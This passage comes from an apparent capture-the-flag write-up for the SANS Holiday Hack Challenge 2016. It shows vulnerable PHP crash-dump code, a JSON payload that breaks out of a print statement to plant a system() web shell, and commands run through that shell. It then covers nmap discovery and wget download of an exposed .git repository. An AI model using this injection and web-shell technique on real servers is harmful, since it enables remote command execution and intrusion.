    &lt;span class="k"&gt;elseif&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;# Read a crash dump back from disk&lt;/span&gt;
        &lt;span class="nx"&gt;readCrashdump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;# data key unset&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Fatal error! JSON key &amp;#39;data&amp;#39; must be set.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;processCrashdump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$crashdump&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$basepath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/var/www/html/docs/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$outputfilename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;tempnam&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$basepath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;crashdump-&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nb"&gt;unlink&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$outputfilename&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="nv"&gt;$outputfilename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$outputfilename&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$basename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$outputfilename&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$crashdump_encoded&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;?php print(&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$crashdump&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;JSON_PRETTY_PRINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;#39;);&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;    &lt;span class="nb"&gt;file_put_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$outputfilename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$crashdump_encoded&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="dl"&gt;END&lt;/span&gt;&lt;span class="s"&gt;&lt;/span&gt;
&lt;span class="s"&gt;{&lt;/span&gt;
&lt;span class="s"&gt;    &amp;quot;success&amp;quot; : true,&lt;/span&gt;
&lt;span class="s"&gt;    &amp;quot;folder&amp;quot; : &amp;quot;docs&amp;quot;,&lt;/span&gt;
&lt;span class="s"&gt;    &amp;quot;crashdump&amp;quot; : &amp;quot;$basename&amp;quot;&lt;/span&gt;
&lt;span class="s"&gt;}&lt;/span&gt;

&lt;span class="dl"&gt;END&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;readCrashdump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$requestedCrashdump&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$basepath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/var/www/html/docs/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nb"&gt;chdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$basepath&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$requestedCrashdump&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;crashdump&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Fatal error! JSON key &amp;#39;crashdump&amp;#39; must be set.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nb"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strrchr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$requestedCrashdump&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;crashdump&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Fatal error! crashdump value duplicate &amp;#39;.php&amp;#39; extension detected.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$requestedCrashdump&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;crashdump&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now that I'm pasting this source code, I see that the audio file path is given
in the top comment of the file. But I was so eager to find out how
&lt;code&gt;WriteCrashDump&lt;/code&gt; and &lt;code&gt;ReadCrashDump&lt;/code&gt; work that I didn't see it.
Woopsie for me! Ok, bear with me, and let's suppose that the audio file was not
given in the comment (plus, it's more fun this way, so there!).&lt;/p&gt;
&lt;p&gt;When we call &lt;code&gt;WriteCrashDump&lt;/code&gt;, we can see that our data are JSON encoded,
surrounded by &lt;code&gt;print('&lt;/code&gt; and &lt;code&gt;');&lt;/code&gt;, then stored in a PHP file.
Since JSON encoding does not encode single-quote, we can escape from our
&lt;code&gt;print&lt;/code&gt; statement:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;309&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;#39;);system($_GET[&amp;#39;c&amp;#39;]);die();print(&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lmessage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;model&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;sdkint&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;device&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;product&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lversion&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapsz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapszlimit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;natallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;cpuusage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;totalstor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freestor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;busystor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 16:01:28 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;81&lt;/span&gt;

{
    &amp;quot;success&amp;quot; : true,
    &amp;quot;folder&amp;quot; : &amp;quot;docs&amp;quot;,
    &amp;quot;crashdump&amp;quot; : &amp;quot;crashdump-F4Xkdl.php&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have a functional webshell, stored in the &lt;code&gt;crashdump-F4Xkdl.php&lt;/code&gt;
file. We just have to put our wanted command in the &lt;code&gt;GET&lt;/code&gt; parameter
&lt;code&gt;c&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/docs/crashdump-F4Xkdl.php?c=whoami&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 16:03:01 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;28&lt;/span&gt;

{
&lt;span class="hll"&gt;    &amp;quot;message&amp;quot;: &amp;quot; www-data
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yes, our command was executed properly. We can now list the content of the
webroot:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/docs/crashdump-F4Xkdl.php?c=ls+-lh+../&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 16:04:14 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;237&lt;/span&gt;

{
    &amp;quot;message&amp;quot;: &amp;quot; total 352K
&lt;span class="hll"&gt;-rw-r--r-- 1 jeff     jeff     219K Dec  7 17:08 discombobulated-audio-6-XyzE3N9YqKNH.mp3
&lt;/span&gt;drwxr-xr-x 2 www-data www-data 124K Dec 29 16:01 docs
-r--r--r-- 1 www-data www-data 2.4K Dec  7 16:58 exception.php
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have the name of the audio file, without having to rely on the comment
in the &lt;code&gt;exception.php&lt;/code&gt; file, we're such haXXorz. Anyway, the URL to the
audio file is: &lt;a class="reference external" href="http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3"&gt;http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/a&gt;&lt;/p&gt;
&lt;img alt="ex_audio_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/ex_audio_result.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="the-mobile-analytics-server-post-authentication"&gt;
&lt;h3&gt;&lt;a class="reference external" href="https://analytics.northpolewonderland.com/"&gt;The Mobile Analytics Server (post authentication)&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We may have found the first audio file in the analytics server by logging in,
but we haven't taken a look at the functionalities offered by the server.
Basically, we can query some usage information of the Android application,
and save these queries:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;First, we performed a query, that we save:&lt;/li&gt;
&lt;/ul&gt;
&lt;img alt="analytics_guest_query.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_query.png" /&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Then, we get the result of our query:&lt;/li&gt;
&lt;/ul&gt;
&lt;img alt="analytics_guest_query_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_query_result.png" /&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;We can then consult the result of our saved query:&lt;/li&gt;
&lt;/ul&gt;
&lt;img alt="analytics_guest_query_saved.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_query_saved.png" /&gt;
&lt;p&gt;Playing with the different parameters to conduct usual attacks (SQLi, LFI,
etc.) didn't lead to anything. On the suggestion of one of the elves, we can
use &lt;code&gt;nmap -sC&lt;/code&gt; to find interesting files hosted by the web server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nmap -sC analytics.northpolewonderland.com
&lt;span class="go"&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2016-12-26 11:52 CET&lt;/span&gt;
&lt;span class="go"&gt;Nmap scan report for analytics.northpolewonderland.com (104.198.252.157)&lt;/span&gt;
&lt;span class="go"&gt;Host is up (0.14s latency).&lt;/span&gt;
&lt;span class="go"&gt;rDNS record for 104.198.252.157: 157.252.198.104.bc.googleusercontent.com&lt;/span&gt;
&lt;span class="go"&gt;Not shown: 998 filtered ports&lt;/span&gt;
&lt;span class="go"&gt;PORT    STATE SERVICE&lt;/span&gt;
&lt;span class="go"&gt;22/tcp  open  ssh&lt;/span&gt;
&lt;span class="go"&gt;|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)&lt;/span&gt;
&lt;span class="go"&gt;443/tcp open  https&lt;/span&gt;
&lt;span class="go"&gt;| http-git:&lt;/span&gt;
&lt;span class="go"&gt;|   104.198.252.157:443/.git/&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;|     Git repository found!&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;|     Repository description: Unnamed repository; edit this file &amp;#39;description&amp;#39; to name the...&lt;/span&gt;
&lt;span class="go"&gt;|_    Last commit message: Finishing touches (style, css, etc)&lt;/span&gt;
&lt;span class="go"&gt;|_http-methods: No Allow or Public header in OPTIONS response (status code 405)&lt;/span&gt;
&lt;span class="go"&gt;| http-title: Sprusage Usage Reporter!&lt;/span&gt;
&lt;span class="go"&gt;|_Requested resource was login.php&lt;/span&gt;
&lt;span class="go"&gt;| ssl-cert: Subject: commonName=analytics.northpolewonderland.com&lt;/span&gt;
&lt;span class="go"&gt;| Not valid before: 2016-12-07T17:35:00+00:00&lt;/span&gt;
&lt;span class="go"&gt;|_Not valid after:  2017-03-07T17:35:00+00:00&lt;/span&gt;
&lt;span class="go"&gt;|_ssl-date: 1970-06-11T20:44:11+00:00; -46y197d14h08m10s from local time.&lt;/span&gt;
&lt;span class="go"&gt;| tls-nextprotoneg:&lt;/span&gt;
&lt;span class="go"&gt;|_  http/1.1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A Git repository was found. That's very interesting, because it means we can
download the source code of the website to analyze it. It also means that we
have access to the history of every file modifications. Let's download the
source of the web site with &lt;code&gt;wget&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; wget -r -k -np https://analytics.northpolewonderland.com/.git/
&lt;span class="go"&gt;--2016-12-26 11:53:55--  https://analytics.northpolewonderland.com/.git/&lt;/span&gt;
&lt;span class="go"&gt;Résolution de analytics.northpolewonderland.com (analytics.northpolewonderland.com)… 104.198.252.157&lt;/span&gt;
&lt;span class="go"&gt;Connexion à analytics.northpolewonderland.com (analytics.northpolewonderland.com)|104.198.252.157|:443… connecté.&lt;/span&gt;
&lt;span class="go"&gt;requête HTTP transmise, en attente de la réponse… 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Taille : non indiqué [text/html]&lt;/span&gt;
&lt;span class="go"&gt;Sauvegarde en : « analytics.northpolewonderland.com/.git/index.html »&lt;/span&gt;

&lt;span class="go"&gt;analytics.northpolewonderland.com/.git/index.html     [ &amp;lt;=&amp;gt;                                                                                                          ]   1,36K  --.-KB/s   ds 0s&lt;/span&gt;

